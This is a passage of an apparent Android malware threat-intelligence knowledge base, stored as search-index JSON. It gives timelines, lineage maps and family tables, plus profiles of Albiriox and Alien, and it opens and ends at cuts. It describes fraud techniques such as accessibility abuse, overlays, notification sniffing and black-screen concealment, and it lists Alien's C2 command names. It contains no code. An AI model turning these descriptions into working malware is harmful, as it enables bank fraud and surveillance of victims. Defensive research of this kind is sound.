Rapid development cycle. 2024 GoldPickaxe GoldFactory group. Captures facial biometric data to create deepfakes for bypassing bank face-verification. 2024 Antidot Multi-language banking trojan with 35 commands. AppLite variant targets corporate employees. 2024 BlankBot Turkish-focused banker with custom keyboard keylogging. Under active development when discovered. 2024 TrickMo TrickBot companion resurfaces independently. Fake lockscreen captures device PINs. 40+ C2 variants. 2024 Rafel RAT Open-source Android RAT used in 120+ campaigns. Includes ransomware capability. APT-C-35 usage. 2025 Frogblight Turkish banker with custom keyboard keylogging. Geofencing avoids US detection. 2025 Crocodilus Full DTO with contact list injection. Adds fake \"Bank Support\" contacts for vishing. 8-country targeting. 2025 Herodotus MaaS banker by \"K1R0.\" Types with natural delays to evade behavioral biometrics during DTO. 2025 Sturnus Reads decrypted WhatsApp/Telegram/Signal messages via accessibility. Southern/Central European banks. 2025 RatOn First family combining NFC relay with ATS. Automates full card cloning and transfer fraud. 2025 Klopatra Virbox-packed Turkish banker. Operators execute ODF attacks while victims sleep. 2025 Albiriox Budget MaaS ($650-720/month) by \"MECipher.\" 400+ targets, unencrypted TCP C2. 2025 GodFather v3 On-device virtualization: installs real banking apps inside sandbox, intercepts all interactions. 2025 BTMOB RAT MaaS RAT evolved from CraxRAT/SpySolr. WebView injection, Media Projection streaming. $5k-$10k pricing. 2025 FireScam Info-stealer via fake RuStore/Telegram Premium. Firebase for both C2 and data exfiltration. Russian-targeting. 2025 DeVixor Iranian banking RAT with ransomware. 700+ samples. TRON crypto ransom payments. 2025 Hook v3 107 commands. Ransomware overlays, NFC payment card overlays, transparent gesture capture. 2025 TsarBot 750+ app targets across banking, crypto, social media. WebSocket C2, fake lockscreen PIN capture. 2025 Zanubis Peruvian banker evolved to impersonate SUNAT tax authority. 40+ banking app targets. <p>Era Summary</p> <p>Reduced permission footprints, steganographic payloads, OCR-based theft, NFC relay attacks, on-device virtualization, commercial packer abuse.</p>"},{"location":"malware/timeline/#spyware-timeline","title":"Spyware Timeline","text":"<p>Separate Track</p> <p>Commercial spyware operates on a separate track from financially-motivated malware, with different distribution, capabilities, and targets.</p> Year Family Significance 2012 FinSpy FinFisher GmbH's commercial lawful intercept. Sold to governments globally. Heavily obfuscated. 2014 FinSpy leaked Phineas Fisher hack exposed 40GB of FinFisher data including source code. 2016 Pegasus NSO Group. Trident exploit chain discovered via Ahmed Mansoor. Zero-click capability. 2017 EagleMsgSpy Chinese law enforcement surveillance tool by Wuhan Chinasoft Token. Physical access install, chat app interception. 2019 Hermit RCS Lab. Distributed via ISP-level network injection. Modular architecture. 2020 LightSpy APT41 (Chinese state). Modular surveillance with 14+ plugins. Cross-platform (Android/iOS/macOS/Windows). Watering hole delivery. 2019 Predator Cytrox/Intellexa. Exploit chain delivery. Alien loader + Predator implant architecture. 2021 Pegasus Project Forbidden Stories investigation revealed 50,000+ potential surveillance targets across governments. 2022 Predator exploits Google TAG documented five zero-day exploits (four Chrome, one Android kernel) used by Predator. 2022 FinFisher bankrupt German investigation into unauthorized exports led to company insolvency. 2023 Predator Files Amnesty/EIC investigation: Predator sold to 25+ countries. 2024 Intellexa sanctioned U.S. Treasury sanctions against Intellexa consortium. 2021 BoneSpy Sandcat (Uzbekistan SSS). DroidWatcher-based surveillanceware targeting Central Asian former Soviet states. 2024 AridSpy Arid Viper (APT-C-23). Multi-stage trojanized messaging apps targeting Palestine and Egypt. 2024 PlainGnome Sandcat. Custom-built two-stage dropper. Screen-off audio recording bypasses Android microphone indicator. 2024 GuardZoo Houthi-aligned. Modified Dendroid RAT targeting Middle Eastern military. 450+ victims since 2019. 2025 KoSpy DPRK (ScarCruft/APT37). Firebase Firestore C2. Plugin-based surveillance on Google Play. 2024 PJobRAT Resurfaces targeting Taiwan military via fake messaging apps. Dual HTTP/WebSocket C2. 2021 DCHSpy MuddyWater/MOIS Android surveillanceware. Fake VPN/StarLink lures targeting Iranian dissidents. SFTP exfiltration. Full Technique Adoption Timeline <p>Shows when key techniques first appeared and became standard:</p> Technique Introduced Became Standard First Used By Premium SMS fraud 2010 2010-2012 FakePlayer Root exploits 2011 2011-2013 DroidDream Overlay attacks 2014 2016-2018 GM Bot Device admin abuse 2013 2014-2016 Obad Accessibility abuse 2018 2019-2020 Gustuff ATS (auto-transfers) 2018 2021-2022 Gustuff SMS worm distribution 2020 2020-2021 FluBot Play Store droppers 2016 2020+ BankBot VNC-like control 2021 2022-2023 Vultur, Octo Anti-forensic wipe 2021 Uncommon BRATA Biometric bypass 2023 Rare Chameleon Biometric theft 2023 Rare GoldPickaxe Reduced permissions 2024 Emerging Medusa v2 OCR-based theft 2024 Emerging SparkCat, SpyAgent Manifest obfuscation 2024 Rare SoumniBot Auto-execution on install 2024 Rare MoqHao Custom keyboard keylogging 2025 Rare Frogblight Steganographic payloads 2024 Rare Necro SDK supply chain 2023 Growing Goldoson, Necro NFC relay 2024 Emerging NGate On-device virtualization 2025 Rare GodFather v3 Human behavior mimicry 2025 Rare Herodotus Encrypted messaging interception 2025 Rare Sturnus Contact list injection 2025 Rare Crocodilus NFC relay + ATS combo 2025 Rare RatOn Commercial packer abuse 2025 Emerging Klopatra, Gigabud Fake lockscreen PIN capture 2024 Emerging TrickMo, TsarBot Firebase C2 config delivery 2022 Emerging KoSpy, PJobRAT Corporate employee targeting 2024 Rare Antidot/AppLite Clipboard hijacking 2019 Standard Cerberus Firebase C2/exfiltration 2022 Emerging KoSpy, FireScam Voice call interception 2022 Rare Fakecalls SFTP exfiltration 2021 Rare DCHSpy Predatory lending extortion 2020 Growing SpyLoan Flutter/Dart framework abuse 2023 Rare FluHorse Screen-off audio recording 2024 Rare PlainGnome"},{"location":"malware/timeline/#law-enforcement-actions","title":"Law Enforcement Actions","text":"Year Event Impact 2020 Cerberus source code leaked Spawned Alien, Ermac, Hook lineage. Single most impactful code leak in Android malware history. 2021 Europol takes down FluBot Operation coordinated across 11 countries. Infrastructure seized, suspects arrested. 2022 FinFisher declares bankruptcy German investigation into unauthorized exports of surveillance tools. 2024 Intellexa/Cytrox sanctioned U.S. Treasury sanctions against Predator spyware consortium. 2024 Anubis/Medusa infrastructure disruption Multiple C2 domains seized through coordinated takedowns. 2025 Hook operators arrested Several affiliates arrested in Europe through ThreatFabric intelligence sharing with law enforcement. <p>Impact</p> <p>The 2020 Cerberus source code leak was the single most consequential event in Android malware history. It directly spawned Alien, Ermac, and the Hook lineage -- families that dominated the threat landscape from 2020 through 2025.</p>"},{"location":"malware/families/","title":"Malware Families","text":"<p>Individual write-ups on notable Android malware families. Each entry documents origin, capabilities, distribution, target regions, C2 infrastructure, and links to primary research from the teams who analyzed them.</p> <p>Families are grouped by primary function. Many overlap categories (a banking trojan may also be spyware). The primary classification reflects their main operational purpose. For how different vendors name the same family, see Naming Conventions. For chronological evolution, see Timeline.</p>"},{"location":"malware/families/#lineage-map","title":"Lineage Map","text":"<p>Several families share code lineage. Understanding these relationships is critical for attribution and capability prediction.</p> <pre><code>graph LR\n    BankBot[\"BankBot (2016)\"] --&gt; Anubis[\"Anubis (2017)\"]\n    Anubis --&gt; GodFather[\"GodFather (2022)\"]\n\n    Cerberus[\"Cerberus (2019)\"] --&gt; Alien[\"Alien (2020)\"]\n    Alien --&gt; Ermac[\"Ermac (2021)\"]\n    Ermac --&gt; Hook[\"Hook (2023)\"]\n\n    Exobot[\"Exobot (2016)\"] --&gt; ExobotCompact[\"ExobotCompact/Coper (2021)\"]\n    ExobotCompact --&gt; Octo[\"Octo (2022)\"]\n    ExobotCompact -.-&gt;|\"?\"| Frogblight[\"Frogblight (2025)\"]\n\n    BRATA[\"BRATA (2019)\"] --&gt; Copybara[\"Copybara (2021)\"]\n\n    TgToxic[\"TgToxic (2022)\"] --&gt; ToxicPanda[\"ToxicPanda (2024)\"]\n\n    CraxRAT --&gt; SpySolr\n    SpySolr --&gt; BTMOB[\"BTMOB RAT (2025)\"]</code></pre>"},{"location":"malware/families/#banking-trojans","title":"Banking Trojans","text":"<p>The largest and most actively developed category. Modern banking trojans combine overlay injection, accessibility abuse, and ATS (Automated Transfer Systems) for on-device fraud.</p>"},{"location":"malware/families/#cerberus-lineage","title":"Cerberus Lineage","text":"Family Active Origin Key Innovation Cerberus 2019-2020 MaaS Source leak spawned Alien, Ermac, Hook ecosystem Alien 2020-2021 Cerberus fork Added notification sniffing, TeamViewer remote access Ermac 2021-2022 Cerberus/Alien fork Refined codebase, 467 overlay targets Hook 2023-present Ermac fork VNC, RAT, ATS in single package"},{"location":"malware/families/#anubis-lineage","title":"Anubis Lineage","text":"Family Active Origin Key Innovation BankBot 2016-2018 Open source First widely accessible banking trojan source code Anubis 2017-2020 BankBot evolution Overlay + keylogger + ransomware combo GodFather 2022-present Anubis evolution Dynamic overlays, 400+ targets"},{"location":"malware/families/#exobot-lineage","title":"Exobot Lineage","text":"Family Active Origin Key Innovation Octo 2022-present ExobotCompact/Coper Remote access via screen streaming Frogblight 2025-present Possible Coper connection Custom keyboard keylogging, Turkish focus"},{"location":"malware/families/#independent","title":"Independent","text":"Family Active Origin Key Innovation Albiriox 2025-present MaaS Budget MaaS ($650-720/month), 400+ targets, unencrypted TCP C2 Anatsa 2021-present Independent ATS fraud pioneer on Google Play, targets EU banking Antidot 2024-present Independent Multi-language overlays, VNC, AppLite corporate variant BingoMod 2024-present Independent Post-fraud device wipe, VNC-based DTO BRATA 2019-2022 Independent Factory reset after fraud, evidence destruction Brokewell 2024-present Independent Rapid development cycle, \"Baron Samedit Marais\" Chameleon 2023-present Independent Biometric prompt bypass to force PIN capture Copybara 2021-present BRATA evolution Italian-focused, TOAD delivery via vishing Crocodilus 2025-present Independent Contact list injection, full DTO, 8-country targeting Gigabud 2022-present GoldFactory Screen recording instead of overlays, shared infrastructure with SpyNote GoldPickaxe 2023-present GoldFactory Facial biometric theft for deepfake bank verification bypass Gustuff 2018-2020 Independent Early ATS implementation via accessibility Herodotus 2025-present MaaS Human behavior mimicry during device takeover Hydra 2019-present MaaS Persistent MaaS operation, wide affiliate network Medusa 2020-present MaaS Screen streaming, keylogging, broad targeting NGate 2024 Independent First NFC relay malware, clones payment cards for ATM withdrawal PixPirate 2022-present Independent Targets Brazil's Pix instant payment system RatOn 2025-present Independent First to combine NFC relay with ATS SharkBot 2021-present Independent ATS + DGA + dropper-on-Play pipeline Sturnus 2025-present Independent Encrypted messaging interception via accessibility ToxicPanda 2024-present TgToxic evolution EU/LATAM expansion, Chinese-speaking actor TrickMo 2019-present TrickBot companion Fake lockscreen PIN capture, 40+ C2 variants TsarBot 2025-present Independent 750+ app targets, WebSocket C2, fake lockscreen Vultur 2021-present Independent Screen streaming over overlays, AlphaVNC Xenomorph 2022-present Independent Rapid feature iteration, ATS engine"},{"location":"malware/families/#regional-banking-trojans","title":"Regional Banking Trojans","text":"Family Active Region Key Innovation Fakecalls 2022-present South Korea Voice call interception, IVR impersonation FluHorse 2022-present East Asia (Taiwan, Vietnam) Flutter-based, Dart AOT in libapp.so defeats standard decompilers Frogblight 2025-present Turkey Custom keyboard keylogging, geofencing BlankBot 2024-present Turkey Custom keyboard keylogging, under active development Klopatra 2025-present Turkey Virbox packer, nighttime ODF attacks Mamont 2024-present Russia Highest-volume banker in 2024, notification interception SoumniBot 2024-present South Korea Novel manifest obfuscation techniques DeVixor 2025-present Iran Banking RAT with ransomware, 700+ samples, TRON ransom payments Zanubis 2022-present Peru Government (SUNAT) impersonation"},{"location":"malware/families/#sms-and-toll-fraud","title":"SMS and Toll Fraud","text":"<p>Monetize through premium SMS, WAP billing, or subscription fraud. Often distributed through Google Play using dropper techniques.</p> Family Active Key Innovation Joker 2017-present Most persistent Play Store threat, thousands of variants FluBot 2020-2022 SMS worm with explosive spread, law enforcement takedown Harly 2020-present Subscription fraud via invisible WebView GriftHorse 2020-2021 Premium SMS at scale, 10M+ victims"},{"location":"malware/families/#smishing-and-distribution","title":"Smishing and Distribution","text":"<p>Families whose primary capability is SMS-based propagation and phishing delivery.</p> Family Active Key Innovation MoqHao 2018-present Longest-running mobile smishing operation, auto-execution (2024)"},{"location":"malware/families/#spyware-and-surveillance","title":"Spyware and Surveillance","text":"<p>Commercial or state-sponsored implants designed for targeted surveillance. Distinct from banking trojans in purpose (intelligence collection vs financial theft) and distribution (targeted delivery vs mass campaigns).</p> Family Active Operator Key Capability Pegasus 2016-present NSO Group (Israel) Zero-click exploits, full device compromise Predator 2019-present Cytrox/Intellexa (EU) Exploit chain delivery, modular implant FinSpy 2012-2022 FinFisher (Germany) Commercial lawful intercept, heavily obfuscated Hermit 2019-present RCS Lab (Italy) ISP-level delivery via network injection KoSpy 2022-present ScarCruft/APT37 (DPRK) Firebase Firestore C2 config, plugin-based surveillance LightSpy 2020-present APT41 (China) 14+ plugin modular framework, WeChat Pay theft, cross-platform AridSpy 2024-present Arid Viper/APT-C-23 (Palestinian) Multi-stage trojanized messaging apps BoneSpy 2021-present Sandcat (Uzbekistan SSS) DroidWatcher-based, SMS command control EagleMsgSpy 2017-present Chinese public security bureaus Lawful intercept, physical access install, chat app interception GuardZoo 2019-present Houthi-aligned (Yemen) Military GPS/mapping file collection, 450+ victims Mandrake 2016-present Unknown Multi-year Play Store presence, OLLVM obfuscation DCHSpy 2021-present MuddyWater/MOIS (Iran) VPN/StarLink lures, SFTP exfiltration, targets Iranian dissidents PlainGnome 2024-present Sandcat (Uzbekistan SSS) Custom-built, two-stage dropper, screen-off audio recording"},{"location":"malware/families/#cryptocurrency-stealers","title":"Cryptocurrency Stealers","text":"<p>Families targeting cryptocurrency wallets through OCR-based seed phrase theft from device photos.</p> Family Active Key Innovation SparkCat 2024-present First OCR stealer on both Play Store and App Store SpyAgent 2024-present 280+ fake apps, OCR seed phrase theft targeting Korea"},{"location":"malware/families/#supply-chain-and-sdk-malware","title":"Supply Chain and SDK Malware","text":"<p>Malicious code distributed through compromised SDKs or pre-installed in firmware.</p> Family Active Key Innovation Triada 2016-present Pre-installed in firmware, modular, ad fraud + backdoor Necro 2024-present Steganographic payload delivery, compromised Coral SDK Goldoson 2023 100M+ installs via malicious SDK in 60+ legitimate apps"},{"location":"malware/families/#predatory-apps","title":"Predatory Apps","text":"<p>Applications that operate as malware through excessive data collection and weaponization of personal information.</p> Family Active Key Innovation SpyLoan 2020-present Predatory lending apps, data used for harassment/extortion"},{"location":"malware/families/#nfc-relay","title":"NFC Relay","text":"<p>An emerging attack category using NFC relay to clone contactless payment cards for ATM cash withdrawal or POS fraud.</p> Family Active Key Innovation NGate 2024 First Android NFC relay malware, clones cards via NFCGate RatOn 2025-present First to combine NFC relay with ATS for automated fraud"},{"location":"malware/families/#rats-remote-access-trojans","title":"RATs (Remote Access Trojans)","text":"<p>General-purpose remote access tools providing full device control without specialized financial fraud features.</p> Family Active Key Innovation BTMOB RAT 2025-present MaaS RAT, WebView injection, Media Projection screen streaming SpyNote 2016-present Free/cheap RAT builder, massive operator base Rafel RAT 2022-present Open-source RAT, 120+ campaigns, ransomware capability FireScam 2025-present Info-stealer via fake RuStore/Telegram Premium, Firebase C2 and exfiltration PJobRAT 2021-present Military-targeting RAT, India then Taiwan campaigns"},{"location":"malware/families/albiriox/","title":"Albiriox","text":"<p>Albiriox is an Android banking trojan sold as Malware-as-a-Service (MaaS), discovered by Cleafy in December 2025. Publicly offered since October 2025 at $650-720 per month, Albiriox targets over 400 applications spanning banking, cryptocurrency, fintech, wallet, trading, payments, investment, and gaming categories. The malware provides On-Device Fraud (ODF) capability through VNC remote control and uses a loader/dropper architecture with obfuscation and crypting services. Notably, its C2 communication uses unencrypted TCP, a simplistic choice relative to the sophistication of its other capabilities.</p>"},{"location":"malware/families/albiriox/#overview","title":"Overview","text":"Attribute Details First Seen September 2025 Status Active, public MaaS offering since October 2025 Type Banking trojan, MaaS, RAT Attribution Unknown Pricing $650-720/month Target Apps 400+ (banking, crypto, fintech, wallet, trading, payments, investment, gaming)"},{"location":"malware/families/albiriox/#origin-and-lineage","title":"Origin and Lineage","text":"<p>Cleafy's analysis identifies Albiriox as a new entrant in the Android MaaS ecosystem. First observed in the wild in September 2025, it was publicly advertised as a MaaS offering from October 2025 onward. No direct code lineage to existing banking trojan families has been established.</p> <p>Albiriox enters a crowded MaaS market alongside established players like Octo, Hook, and Medusa. Its pricing at $650-720/month positions it as a budget-friendly alternative compared to Hook's former $7,000/month rental price, making it accessible to lower-tier threat actors. The wide target list of 400+ applications and the inclusion of obfuscation/crypting services suggest the operators are aiming for broad market appeal rather than specialization.</p>"},{"location":"malware/families/albiriox/#distribution","title":"Distribution","text":"Vector Details Loader/dropper Multi-stage architecture separating delivery from payload Obfuscation services Crypting services offered alongside the MaaS subscription <p>Cleafy documented that Albiriox uses a loader/dropper architecture. The dropper handles initial installation and evasion, then downloads and installs the actual malicious payload. The MaaS operation includes obfuscation and crypting services, meaning operators provide their affiliates with tools to evade detection rather than leaving this to the buyer.</p> <p>This bundled approach lowers the technical barrier for affiliates: subscribers receive not just the malware but the infrastructure and tooling needed to deploy it effectively.</p>"},{"location":"malware/families/albiriox/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/albiriox/#core-features","title":"Core Features","text":"Capability Implementation VNC remote control On-Device Fraud through real-time remote access Black/blank screen Hides remote operations from the victim Volume control Mutes device audio during fraud to prevent alerting the victim Overlay injection Phishing overlays targeting 400+ applications Loader/dropper Multi-stage deployment with obfuscation Crypting services Detection evasion tooling provided to affiliates"},{"location":"malware/families/albiriox/#on-device-fraud-odf","title":"On-Device Fraud (ODF)","text":"<p>Albiriox provides ODF capability through VNC-based remote control, allowing operators to:</p> <ol> <li>View the device screen in real-time via VNC</li> <li>Navigate banking and financial apps as the legitimate user</li> <li>Initiate and approve transactions from the compromised device</li> <li>Display a black or blank screen to hide the remote session from the victim</li> <li>Control device volume to suppress notification sounds during fraud</li> </ol> <p>The black screen and volume control are specifically designed for fraud concealment. When an operator takes control, the victim sees a blank screen and hears nothing, making the device appear powered off or idle. This technique is shared with other ODF-capable families like Octo and Hook.</p>"},{"location":"malware/families/albiriox/#target-application-coverage","title":"Target Application Coverage","text":"<p>With over 400 targeted applications, Albiriox covers a broad range of financial services:</p> Category Examples Banking Traditional banking apps across multiple regions Cryptocurrency Crypto exchange and wallet apps Fintech Digital banking and neobank apps Wallet Payment wallet applications Trading Stock and forex trading platforms Payments Payment processing apps Investment Investment and portfolio management apps Gaming Gaming platforms with financial components <p>The inclusion of gaming alongside traditional financial targets reflects a growing trend in mobile malware targeting any application that stores monetary value or payment methods.</p>"},{"location":"malware/families/albiriox/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/albiriox/#c2-communication","title":"C2 Communication","text":"Component Details Protocol TCP (unencrypted) Encryption None Transport Raw TCP connections to C2 server <p>Cleafy's analysis revealed that Albiriox communicates with its C2 infrastructure over unencrypted TCP. This is a notable weakness:</p> <ul> <li>Network-level monitoring can intercept and read all C2 traffic in plaintext</li> <li>Security researchers can analyze command-and-control protocols through simple packet capture</li> <li>Enterprise network detection tools can easily identify and block the traffic</li> <li>Contrast this with families like Octo2, which uses per-request dynamic AES encryption, or FluBot, which evolved to DNS tunneling over HTTPS</li> </ul> <p>The lack of encryption may reflect rapid development prioritizing feature completeness over operational security, or an intentional choice to minimize complexity in the early stages of the MaaS operation.</p>"},{"location":"malware/families/albiriox/#loaderdropper-architecture","title":"Loader/Dropper Architecture","text":"<p>Albiriox uses a multi-stage deployment model:</p> <ol> <li>Dropper: The initial application installed on the device, appearing benign to evade detection</li> <li>Loader: Downloads and installs the actual malicious payload after the dropper establishes persistence</li> <li>Payload: The full banking trojan with VNC, overlay injection, and fraud capabilities</li> </ol> <p>The MaaS operation provides obfuscation and crypting services that process the dropper before distribution, modifying its signature to evade antivirus detection. This service model means affiliates do not need their own crypting infrastructure.</p>"},{"location":"malware/families/albiriox/#maas-infrastructure","title":"MaaS Infrastructure","text":"<p>As a full MaaS operation, Albiriox provides subscribers with:</p> <ul> <li>Builder: Generates customized APKs with affiliate-specific C2 configuration</li> <li>Panel: Web interface for managing bots, monitoring infected devices, and executing fraud</li> <li>VNC client: Real-time device access for on-device fraud</li> <li>Crypting/obfuscation: Detection evasion services bundled with the subscription</li> <li>Target list: Pre-built overlay kits covering 400+ applications</li> </ul>"},{"location":"malware/families/albiriox/#target-regions","title":"Target Regions","text":"<p>Albiriox targets a global audience through its MaaS model. With 400+ targeted applications spanning multiple financial categories and regions, the specific geographic focus depends on individual affiliates and the applications they choose to target. Cleafy's report documents the global scope of the target list, covering banking, crypto, fintech, and wallet applications across multiple countries.</p>"},{"location":"malware/families/albiriox/#notable-campaigns","title":"Notable Campaigns","text":"<p>September 2025: First Albiriox samples observed in the wild, marking the beginning of active development and testing.</p> <p>October 2025: Albiriox is publicly offered as a MaaS product at $650-720/month, entering the competitive Android banking trojan market.</p> <p>December 2025: Cleafy publishes their analysis of Albiriox, documenting its VNC-based ODF capability, 400+ target applications, unencrypted TCP C2 communication, and loader/dropper architecture with bundled crypting services.</p>"},{"location":"malware/families/albiriox/#related-families","title":"Related Families","text":"<p>Albiriox competes directly with established MaaS operations in the Android banking trojan space. Octo offers MediaProjection-based screen streaming with DGA C2 resolution. Hook provides VNC and ATS capabilities, though its source code leak in 2023 fragmented the ecosystem. Medusa combines keylogging with screen streaming across multiple affiliate groups.</p> <p>Albiriox's $650-720/month pricing significantly undercuts the historical prices of these established families (Hook at $7,000/month pre-leak, Octo at premium MaaS pricing). This aggressive pricing strategy, combined with the broad 400+ app target list and bundled crypting services, positions Albiriox as an accessible entry point for lower-budget threat actors seeking ODF capability.</p> <p>The use of unencrypted TCP for C2 communication places Albiriox at the lower end of technical sophistication for C2 protocols compared to its competitors. Whether this represents a temporary shortcut during early development or a persistent architectural decision will become clear as the family matures.</p>"},{"location":"malware/families/albiriox/#references","title":"References","text":""},{"location":"malware/families/alien/","title":"Alien","text":"<p>Alien was the first commercially significant fork of Cerberus after its source code leaked in September 2020. Rented as MaaS on underground forums from early 2020, it bridged the gap between the original Cerberus operation and the next-generation trojans that followed. ThreatFabric documented Alien as actively operating even before the public Cerberus source leak, running concurrently with the dying Cerberus MaaS. The same threat actor behind Alien, tracked as \"DukeEugene,\" later launched Ermac in 2021 and Hook in 2023, making Alien the critical stepping stone in the Cerberus lineage.</p>"},{"location":"malware/families/alien/#overview","title":"Overview","text":"Attribute Details First Seen January 2020 Last Seen Mid-2021 (superseded by Ermac) Status Inactive as standalone; code lives on through Ermac and Hook Type Banking trojan (MaaS) Attribution \"DukeEugene\" (also behind BlackRock, Ermac, Hook) Aliases Alien Bot, Alien Banker Rental Price $3,000/month (underground forums)"},{"location":"malware/families/alien/#vendor-names","title":"Vendor Names","text":"Vendor Name ThreatFabric Alien Kaspersky Trojan-Banker.AndroidOS.Cerana ESET Android/TrojanDropper.Agent Microsoft TrojanSpy:AndroidOS/Alienbot Trend Micro AndroidOS_Alienbot Fortinet Android/Agent.GJJ!tr Dr.Web Android.BankBot.Alien Symantec Trojan.Gen.MBT"},{"location":"malware/families/alien/#origin-and-lineage","title":"Origin and Lineage","text":"<p>Alien is a direct fork of Cerberus v1 source code. ThreatFabric's analysis proved this through code structure comparison: Alien retains the core Cerberus architecture for overlay injection, accessibility abuse, and C2 communication, layering new capabilities on top. The fork was active from January 2020, meaning the author had access to the Cerberus source months before the public leak in September 2020. This aligns with the timeline of the Cerberus team's internal collapse, suggesting the code was obtained through private channels or team members.</p> <p>DukeEugene was simultaneously operating BlackRock, another Android banking trojan discovered in mid-2020. ThreatFabric observed BlackRock sample production cease as Ermac emerged in August 2021, confirming DukeEugene transitioned from Alien/BlackRock to Ermac as a consolidated MaaS offering.</p> <p>The lineage is direct and well-documented:</p> <pre><code>Cerberus (2019) --&gt; Alien (2020) --&gt; Ermac (2021) --&gt; Hook (2023)\n</code></pre> <p>Each successor inherited the predecessor's codebase and added capabilities. NCC Group confirmed this chain through code comparison when analyzing Hook's relationship to Ermac.</p>"},{"location":"malware/families/alien/#distribution","title":"Distribution","text":"<p>Alien operators deployed standard Android banking trojan delivery methods, with a preference for fake app campaigns.</p> Vector Details Phishing sites Typosquatted domains serving APKs disguised as legitimate apps Fake apps Posed as fitness trackers, Flash Player updates, coronavirus information apps, Google Chrome updates Smishing SMS messages linking to phishing download pages Third-party stores APKs distributed through unofficial Android app markets Social media Lure posts directing victims to download pages <p>Distribution infrastructure was shared across DukeEugene's operations. ThreatFabric noted that COVID-19-themed lures were heavily used during 2020, with fake government health apps and pandemic information tools serving as delivery vehicles.</p>"},{"location":"malware/families/alien/#capabilities","title":"Capabilities","text":"<p>Alien inherited all of Cerberus v1's functionality and introduced several features that would define the next generation.</p> Capability Implementation Overlay attacks WebView-based injects via accessibility service foreground detection, targeting 226+ banking and crypto apps Notification sniffer Abuses <code>BIND_NOTIFICATION_LISTENER_SERVICE</code> to read all device notifications, capturing 2FA codes from banking apps, authenticators, and email clients TeamViewer RAT Silently installs and launches TeamViewer for full remote device control, enabling manual fraud operations Keylogging Accessibility-based keystroke capture across all applications SMS interception Read, send, and forward SMS messages for OTP theft Contact harvesting Exfiltrate contact list to C2 Call forwarding Forward incoming calls to attacker-controlled numbers App listing Enumerate installed packages to determine overlay targets Self-protection Hide app icon, prevent uninstallation via device admin abuse Google Authenticator theft Read 2FA codes directly from Authenticator app UI via accessibility events"},{"location":"malware/families/alien/#notification-sniffer","title":"Notification Sniffer","text":"<p>The notification sniffer was Alien's most significant addition over Cerberus. By requesting the <code>BIND_NOTIFICATION_LISTENER_SERVICE</code> permission and using accessibility to auto-grant it, Alien gained passive access to every notification on the device. This captured 2FA codes from banking apps that deliver OTPs via push notification rather than SMS, a blind spot in Cerberus's SMS-only interception.</p>"},{"location":"malware/families/alien/#teamviewer-integration","title":"TeamViewer Integration","text":"<p>Rather than implementing custom VNC or screen streaming, Alien took a shortcut: it silently downloaded and installed TeamViewer, then used accessibility to auto-grant its permissions and initiate sessions. This gave operators full remote control without developing RAT functionality from scratch. The approach was effective but noisy, as TeamViewer's presence on a device is detectable.</p>"},{"location":"malware/families/alien/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/alien/#accessibility-abuse","title":"Accessibility Abuse","text":"<p>Alien's core loop follows the Cerberus pattern with enhancements:</p> <ol> <li>Persistent prompt forces the user to enable accessibility service</li> <li>Once enabled, auto-grants SMS, phone, contacts, and notification listener permissions</li> <li>Monitors <code>TYPE_WINDOW_STATE_CHANGED</code> events for foreground app detection</li> <li>Triggers overlay injection when target apps enter foreground</li> <li>Notification listener service captures all push notifications passively</li> <li>TeamViewer installed and configured for remote access sessions</li> </ol>"},{"location":"malware/families/alien/#c2-communication","title":"C2 Communication","text":"<p>Alien's C2 protocol is an evolution of Cerberus's HTTP-based approach:</p> <ul> <li>HTTP POST requests to hardcoded C2 domains</li> <li>Data encrypted before transmission (updated encryption from Cerberus baseline)</li> <li>Bot registers on first launch with device fingerprint</li> <li>Regular polling intervals for command retrieval</li> <li>Inject pages fetched from C2 by target package name</li> </ul> <p>Key C2 commands:</p> Command Action <code>push</code> Display push notification to lure user into opening target app <code>startApp</code> Launch specified application to trigger overlay <code>getContacts</code> Exfiltrate contact list <code>sentSMS</code> Send SMS from victim device <code>startForward</code> Forward calls to attacker number <code>startVNC</code> Initialize TeamViewer remote session <code>getAccounts</code> Steal accounts stored on device <code>getInstalledApps</code> Enumerate installed packages"},{"location":"malware/families/alien/#anti-analysis","title":"Anti-Analysis","text":"Technique Method Emulator detection Checks build properties, SIM state, and hardware fingerprints String obfuscation Critical strings encrypted and resolved at runtime Delayed activation Payload dormant until specific conditions met Icon hiding App icon removed from launcher after initial setup"},{"location":"malware/families/alien/#target-regions-and-financial-institutions","title":"Target Regions and Financial Institutions","text":"<p>Alien cast a wide net, with inject kits covering institutions across multiple continents. ThreatFabric reported coverage of 226+ applications.</p> Region Countries Western Europe Spain, France, Italy, Germany, UK, Belgium, Netherlands Eastern Europe Turkey, Poland North America United States, Canada Asia-Pacific Australia Cryptocurrency MetaMask, Trust Wallet, Coinbase, Blockchain.com <p>Spanish and Turkish financial institutions were particularly well-represented in the inject kit, consistent with Cerberus's original targeting focus. The addition of cryptocurrency wallet targets reflected the broader 2020-era trend of banking trojans expanding into crypto theft.</p>"},{"location":"malware/families/alien/#notable-campaigns","title":"Notable Campaigns","text":"<p>January 2020: Alien first observed operating as a rented MaaS alongside the still-active Cerberus. ThreatFabric identified it as a Cerberus v1 fork with enhanced capabilities.</p> <p>Mid-2020: COVID-19-themed distribution campaigns peaked. Alien samples posed as pandemic tracking apps, government health information tools, and coronavirus safety applications.</p> <p>July 2020: Cerberus's author put the project up for auction. Alien positioned as the active successor for operators migrating off Cerberus.</p> <p>September 2020: Cerberus source leaked publicly. Alien's operator base expanded as former Cerberus renters sought a maintained alternative. ThreatFabric published \"Alien: the story of Cerberus' demise\", providing the definitive analysis of the family.</p> <p>Late 2020 - Mid-2021: Alien remained the dominant Cerberus derivative available for rent, targeting European banking customers across multiple campaigns.</p> <p>August 2021: DukeEugene launched Ermac, identified by ThreatFabric as built on the same codebase. Alien campaigns declined as the operator migrated renters to the newer, more capable product.</p>"},{"location":"malware/families/alien/#references","title":"References","text":""},{"location":"malware/families/anatsa/","title":"Anatsa","text":"<p>Anatsa is an Android banking trojan that pioneered on-device Automated Transfer System (ATS) fraud through Google Play Store distribution. Active since January 2021, it uses accessibility services to initiate bank transfers directly from the victim's device, bypassing \"new device enrollment\" checks that banks rely on to detect fraud. Its persistent ability to land dropper apps on Google Play, combined with a growing target list of 800+ financial institutions, makes it one of the most operationally successful Android banking trojans.</p>"},{"location":"malware/families/anatsa/#overview","title":"Overview","text":"Attribute Details First Seen January 2021 Status Active (2025) Type Banking trojan, ATS fraud Aliases TeaBot, Toddler Attribution Unknown, financially motivated Distribution Google Play Store 